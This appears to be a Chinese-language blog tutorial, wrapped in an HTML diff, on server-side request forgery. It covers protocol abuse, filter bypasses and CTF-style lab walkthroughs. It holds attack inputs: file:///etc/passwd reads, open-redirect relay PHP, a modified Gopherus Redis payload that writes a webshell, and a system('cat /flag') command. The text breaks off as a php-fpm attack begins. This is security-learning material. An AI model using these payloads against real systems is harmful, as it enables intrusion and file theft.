@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="QrYuOcgHntsSXYVGvWVZS98NACE7wP7Rx3KVbK2_F1s">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-128x128-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离沫凌天๓" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="SSRF服务端请求伪造攻击什么是SSRF服务端请求伪造攻击（Server-sideRequestForgery）简称SSRF，当WEB应用提供了从其他服务器获取数据的功能，但没有对远程服务器地址和远程服务器返回的信息进行合理的验证和过滤，就可能存在这种服务端请求伪造。 SSRF漏洞可以做什么 可以扫描内部网络，获得端口、服务信息  1234?url=192.168.32.158:22http://">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF服务端请求伪造攻击">
+<meta property="og:url" content="https://winthorlimo.github.io/note/2020/undefined08/ce4db0e6.html">
+<meta property="og:site_name" content="离沫凌天๓">
+<meta property="og:description" content="SSRF服务端请求伪造攻击什么是SSRF服务端请求伪造攻击（Server-sideRequestForgery）简称SSRF，当WEB应用提供了从其他服务器获取数据的功能，但没有对远程服务器地址和远程服务器返回的信息进行合理的验证和过滤，就可能存在这种服务端请求伪造。 SSRF漏洞可以做什么 可以扫描内部网络，获得端口、服务信息  1234?url=192.168.32.158:22http://">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805101247.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805101650.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805131001.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805131315.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805102040.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805102227.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805133217.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805132159.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805132357.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805132606.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805133810.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805134002.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805134110.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805134330.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805135831.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805140009.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805135944.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805140057.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805111222.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805120901.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805120707.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805120728.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805122012.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805122051.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200809204710025.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200810215909.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200810220258.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200810220659.png">
+<meta property="og:updated_time" content="2020-08-20T09:26:23.002Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF服务端请求伪造攻击">
+<meta name="twitter:description" content="SSRF服务端请求伪造攻击什么是SSRF服务端请求伪造攻击（Server-sideRequestForgery）简称SSRF，当WEB应用提供了从其他服务器获取数据的功能，但没有对远程服务器地址和远程服务器返回的信息进行合理的验证和过滤，就可能存在这种服务端请求伪造。 SSRF漏洞可以做什么 可以扫描内部网络，获得端口、服务信息  1234?url=192.168.32.158:22http://">
+<meta name="twitter:image" content="http://qiniuyun.lintstar.top/20200805101247.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://winthorlimo.github.io/note/2020/undefined08/ce4db0e6.html">
+
+
+
+
+
+  <title>SSRF服务端请求伪造攻击 | 离沫凌天๓</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离沫凌天๓</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">花开花落 一路上起起跌跌</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://winthorlimo.github.io/note/2020/undefined08/ce4db0e6.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离沫凌天๓">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离沫凌天๓">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">SSRF服务端请求伪造攻击</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-08T22:00:00+08:00">
+                2020-08-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SSRF服务端请求伪造攻击"><a href="#SSRF服务端请求伪造攻击" class="headerlink" title="SSRF服务端请求伪造攻击"></a>SSRF服务端请求伪造攻击</h1><h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>服务端请求伪造攻击（Server-sideRequestForgery）简称SSRF，当WEB应用提供了从其他服务器获取数据的功能，但没有对远程服务器地址和远程服务器返回的信息进行合理的验证和过滤，就可能存在这种服务端请求伪造。</p>
+<h2 id="SSRF漏洞可以做什么"><a href="#SSRF漏洞可以做什么" class="headerlink" title="SSRF漏洞可以做什么"></a>SSRF漏洞可以做什么</h2><ol>
+<li><p>可以扫描内部网络，获得端口、服务信息</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=192.168.32.158:22</span><br><span class="line">http://10.20.65.13/?url=10.20.65.13:22</span><br><span class="line"></span><br><span class="line">?url=127.0.0.1:3306</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对内网Web应用进行指纹识别，通过访问默认文件实现</p>
+</li>
+<li><p>对内部任意主机和任意端口发送精心构造的请求包进行攻击 (struts2、SQL注入)</p>
+</li>
+<li><p>利用file协议读取本地文件</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source：192.168.32.158：:8080/?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>越过网络防火墙</p>
+</li>
+</ol>
+<p><img src="http://qiniuyun.lintstar.top/20200805101247.png" alt="20200805101247"></p>
+<h1 id="SSRF漏洞探测"><a href="#SSRF漏洞探测" class="headerlink" title="SSRF漏洞探测"></a>SSRF漏洞探测</h1><p><strong>能够对外发起网络请求的地方，就可能存在SSRF</strong></p>
+<ol>
+<li>从远程服务器请求资源 (图片代下载)</li>
+<li>转码服务</li>
+<li>在线翻译</li>
+<li>未公开的api实现以及其他调用URL的功能</li>
+<li>数据库内置功能</li>
+<li>Webmail收取其他邮箱邮件 (pop3,imap,smtp)</li>
+<li>文件处理，编码处理，属性处理 (xmlrpc.xml)</li>
+</ol>
+<h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h2 id="SSRF有关的函数"><a href="#SSRF有关的函数" class="headerlink" title="SSRF有关的函数"></a>SSRF有关的函数</h2><p><strong>PHP:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>file_get_contents()</span><br><span class="line"><span class="number">2.</span>fsockopen()</span><br><span class="line"><span class="number">3.</span>curl_exec()</span><br><span class="line"><span class="number">4.</span>fopen()</span><br></pre></td></tr></table></figure>
+<p><strong>Python:</strong></p>
+<ol>
+<li>urllib 库http头注入</li>
+<li>requests等库中默认跟随30x跳转</li>
+</ol>
+<h2 id="SSRF常见利用–file-协议"><a href="#SSRF常见利用–file-协议" class="headerlink" title="SSRF常见利用–file://协议"></a>SSRF常见利用–file://协议</h2><p>使用file协议读取源码敏感文件，配合fuzz字典，信息搜集</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source：192.168.32.158：:8080/1.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="SSRF常见利用–dict-协议"><a href="#SSRF常见利用–dict-协议" class="headerlink" title="SSRF常见利用–dict://协议"></a>SSRF常见利用–dict://协议</h2><p>使用dict://协议刺探内网端口信息</p>
+<h2 id="SSRF常见利用–Gopher-协议"><a href="#SSRF常见利用–Gopher-协议" class="headerlink" title="SSRF常见利用–Gopher://协议"></a>SSRF常见利用–Gopher://协议</h2><blockquote>
+<p>Gopher拓展攻击面：</p>
+<p>Gopher协议是HTTP协议出现之前，在Internet上常见且常用的一个协议。当然现在Gopher协议已经慢慢淡出历史。</p>
+<p>Gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。这无疑极大拓宽了SSRF的攻击面。</p>
+</blockquote>
+<h2 id="SSRF-REDIS写入WEBSHEEL"><a href="#SSRF-REDIS写入WEBSHEEL" class="headerlink" title="SSRF+REDIS写入WEBSHEEL"></a>SSRF+REDIS写入WEBSHEEL</h2><h3 id="自动化神奇利用生成payload"><a href="#自动化神奇利用生成payload" class="headerlink" title="自动化神奇利用生成payload"></a>自动化神奇利用生成payload</h3><p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p>
+<p><img src="http://qiniuyun.lintstar.top/20200805101650.png" alt="20200805101650"></p>
+<h2 id="SSRF常见利用-urllib头注入"><a href="#SSRF常见利用-urllib头注入" class="headerlink" title="SSRF常见利用-urllib头注入"></a>SSRF常见利用-urllib头注入</h2><p>攻击内网Redis</p>
+<h2 id="SSRF常见利用-30x跳转"><a href="#SSRF常见利用-30x跳转" class="headerlink" title="SSRF常见利用-30x跳转"></a>SSRF常见利用-30x跳转</h2><p>利用http状态码30x来探测端口、服务</p>
+<p>配合burp，即可快速探测。注意二次编码问题，理论上来讲，穿过几层就编码几次</p>
+<p>常见中转脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Location:"</span>.$_GET[<span class="string">"url"</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Location:"</span>.$_GET[<span class="string">'schema'</span>].<span class="string">"://"</span>.$_GET[<span class="string">'host'</span>].<span class="string">":"</span>.$_GET[<span class="string">'port'</span>].<span class="string">"/"</span>.$_GET[<span class="string">"url"</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="SSRF漏洞绕过"><a href="#SSRF漏洞绕过" class="headerlink" title="SSRF漏洞绕过"></a>SSRF漏洞绕过</h1><h2 id="SSRF常见绕过-短地址"><a href="#SSRF常见绕过-短地址" class="headerlink" title="SSRF常见绕过-短地址"></a>SSRF常见绕过-短地址</h2><p>利用各大短地址生成平台，生成短的地址，绕过长度限制</p>
+<h2 id="SSRF常见绕过-xip-io"><a href="#SSRF常见绕过-xip-io" class="headerlink" title="SSRF常见绕过 -xip.io"></a>SSRF常见绕过 -xip.io</h2><p>xip.io是一个公开的DNS解析站，是一个由SamStephenson所提供的免费DNS转址，xip.io用于提供内网DNS解析，许多的套件都利用xip.io来做内网解析，如MAMP，功能就是将***.127.0.0.1.xip.io解析成127.0.0.1。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.xip.io             resolvesto      10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io         resolvesto      10.0.0.1</span><br><span class="line">mysite.10.0.0.1.xip.io      resolvesto      10.0.0.1</span><br><span class="line">foo.bar.10.0.0.1.xip.io     resolvesto      10.0.0.1</span><br></pre></td></tr></table></figure>
+<h2 id="SSRF常见绕过-IP格式绕过"><a href="#SSRF常见绕过-IP格式绕过" class="headerlink" title="SSRF常见绕过-IP格式绕过"></a>SSRF常见绕过-IP格式绕过</h2><p>十进制转换八进制转换十六进制转换不同进制组合转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数字地址(十进制)：127.0.0.1-&gt;2130706433</span><br><span class="line">十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01</span><br><span class="line">八进制：127.0.0.1-&gt;0177.0.0.1或0177.00.00.01</span><br><span class="line">省略写法：127.0.0.1-&gt;127.1</span><br><span class="line">如127.0.0.1：http://localhost/</span><br></pre></td></tr></table></figure>
+<h2 id="SSRF常见绕过-协议绕过"><a href="#SSRF常见绕过-协议绕过" class="headerlink" title="SSRF常见绕过-协议绕过"></a>SSRF常见绕过-协议绕过</h2><p>当url协议限定只为http(s)时，可以利用<strong>followredirect</strong>特性构造302跳转服务file://localhost/etc/passwd在某些java环境下，file:///etc/passwd?1.jpg也是可以读取到</p>
+<h2 id="SSRF进阶利用-log"><a href="#SSRF进阶利用-log" class="headerlink" title="SSRF进阶利用-log"></a>SSRF进阶利用-log</h2><h3 id="Dnslog"><a href="#Dnslog" class="headerlink" title="Dnslog"></a>Dnslog</h3><p>没有办法获取回显的情况下，使用dnslog来获取回显无疑是个好办法</p>
+<h3 id="httplog"><a href="#httplog" class="headerlink" title="httplog"></a>httplog</h3><p>使用http日志也可以方便的定位到存在ssrf的位置，以及ip等详细信息</p>
+<h2 id="SSRF进阶利用-time"><a href="#SSRF进阶利用-time" class="headerlink" title="SSRF进阶利用-time"></a>SSRF进阶利用-time</h2><p>盲注的灵感:<br>其实不只在sql注入和命令执行中有时间盲注，ssrf也有，端口开放不开放产生的时间延迟说不定也有规律可寻</p>
+<h2 id="SSRF进阶利用-dns-rebinding"><a href="#SSRF进阶利用-dns-rebinding" class="headerlink" title="SSRF进阶利用-dns rebinding"></a>SSRF进阶利用-dns rebinding</h2><p><img src="http://qiniuyun.lintstar.top/20200805131001.png" alt="20200805131001"></p>
+<h2 id="差异化导致的问题"><a href="#差异化导致的问题" class="headerlink" title="差异化导致的问题"></a>差异化导致的问题</h2><p>不同的语言和库对url的识别不用，也会导致问题的产生。</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805131315.png" alt="20200805131315"></p>
+<h1 id="SSRF实战"><a href="#SSRF实战" class="headerlink" title="SSRF实战"></a>SSRF实战</h1><blockquote>
+<p><strong>一句话总结：让你的目标代替你去进行操作</strong></p>
+</blockquote>
+<h2 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h2><p>题目：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805102040.png" alt="20200805102040"></p>
+<p>可以探测外网：<br><a href="http://10.20.25.44/?url=https://www.qq.com" target="_blank" rel="noopener">http://10.20.25.44/?url=https://www.qq.com</a></p>
+<p><img src="http://qiniuyun.lintstar.top/20200805102227.png" alt="20200805102227"></p>
+<p>探测内网c段：<br><a href="http://10.20.25.44/?url=file:///etc/hosts" target="_blank" rel="noopener">http://10.20.25.44/?url=file:///etc/hosts</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">//如果把这行注释掉的话，就会直接输出</span></span><br><span class="line">    $result=curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">echo</span>($result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> localhost ::<span class="number">1</span> localhost ip6-localhost ip6-loopback fe00::<span class="number">0</span> ip6-localnet ff00::<span class="number">0</span> ip6-mcastprefix ff02::<span class="number">1</span> ip6-allnodes ff02::<span class="number">2</span> ip6-allrouters <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> <span class="number">1</span>efb3a2d4c9e</span><br></pre></td></tr></table></figure>
+<p>尝试访问<a href="http://10.20.25.44/?url=172.17.0.3" target="_blank" rel="noopener">http://10.20.25.44/?url=172.17.0.3</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">//如果把这行注释掉的话，就会直接输出</span></span><br><span class="line">    $result=curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">echo</span>($result);</span><br><span class="line">&#125;</span><br><span class="line">flag&#123;ssrf1_37863789u82&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/20200805133217.png" alt="20200805133217"></p>
+<h2 id="gopherus-–exploit-redis"><a href="#gopherus-–exploit-redis" class="headerlink" title="gopherus –exploit redis"></a><strong>gopherus –exploit redis</strong></h2><blockquote>
+<p><strong>本质是在你发送的命令前执行 auth &lt;密码&gt; 命令通过服务器的密码验证，从而继续执行后面的命令。</strong></p>
+</blockquote>
+<p><img src="http://qiniuyun.lintstar.top/20200805132159.png" alt="20200805132159"></p>
+<p>项目地址：<a href="https://github.com/Beipy/BeipyVideoResolution" target="_blank" rel="noopener">https://github.com/Beipy/BeipyVideoResolution</a></p>
+<p>题目：<br><a href="http://10.20.25.44:82/" target="_blank" rel="noopener">http://10.20.25.44:82/</a> SSRF 打 redis, redis 密码 root</p>
+<p>审计代码，看到 data/title.php 中有 SSRF 点，且为 curl，可以请求 gopher://。</p>
+<p>所以使用gopherus生成payload，注意参数：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805132357.png" alt="20200805132357"></p>
+<p>进行解码：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805132606.png" alt="20200805132606"></p>
+<p>因为redis需要密码登录，所以我们需要修改payload 加入密码root</p>
+<p>回到scripts/目录下，编辑Redis.py</p>
+<blockquote>
+<p>注意要改的是下面shell的，不是上面反弹shell的</p>
+</blockquote>
+<p><img src="http://qiniuyun.lintstar.top/20200805133810.png" alt="20200805133810"></p>
+<p>加入下面的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*2\r</span><br><span class="line">$4\r</span><br><span class="line">auth\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line"></span><br><span class="line">\r 是回车</span><br><span class="line">*2 表示增加两个参数</span><br><span class="line">$4 表示占四个字节</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>本质是在你发送的命令前执行 auth &lt;密码&gt; 命令通过服务器的密码验证，从而继续执行后面的命令。</p>
+</blockquote>
+<p><img src="http://qiniuyun.lintstar.top/20200805134002.png" alt="20200805134002"></p>
+<p>注意改的时候一定记得字节长度要匹配：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805134110.png" alt="20200805134110"></p>
+<p>重新生成payload：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805134330.png" alt="20200805134330"></p>
+<p><img src="http://qiniuyun.lintstar.top/20200805135831.png" alt="20200805135831"></p>
+<p>再编码一次：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805140009.png" alt="20200805140009"></p>
+<p>上传payload：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805135944.png" alt="20200805135944"></p>
+<p>访问：<a href="http://10.20.25.44:82/wfbww.php" target="_blank" rel="noopener">http://10.20.25.44:82/wfbww.php</a></p>
+<p><img src="http://qiniuyun.lintstar.top/20200805140057.png" alt="20200805140057"></p>
+<p>然后加上：<code>/wfbww.php?a=system(&#39;cat /flag&#39;);</code><br>就可以得到flag</p>
+<blockquote>
+<p>要不要编码要看content type 是urlencoded就已经自动解码过了，所以要再编一次</p>
+<p>get会自动解码一次所以要再编码一次</p>
+</blockquote>
+<h2 id="gopherus-–exploit-fastcgi"><a href="#gopherus-–exploit-fastcgi" class="headerlink" title="gopherus –exploit fastcgi"></a><strong>gopherus –exploit fastcgi</strong></h2><p><a href="http://10.20.25.44:84/" target="_blank" rel="noopener">http://10.20.25.44:84/</a> 打 php-fpm</p>
+<p>首先访问<a href="http://10.20.25.44:91/?url=gopher://127.0.0.1/9000" target="_blank" rel="noopener">http://10.20.25.44:91/?url=gopher://127.0.0.1/9000</a><br>发现在加载，说明开启了相应端口</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805111222.png" alt="20200805111222"></p>
+<p>用工具生成payload:</p>
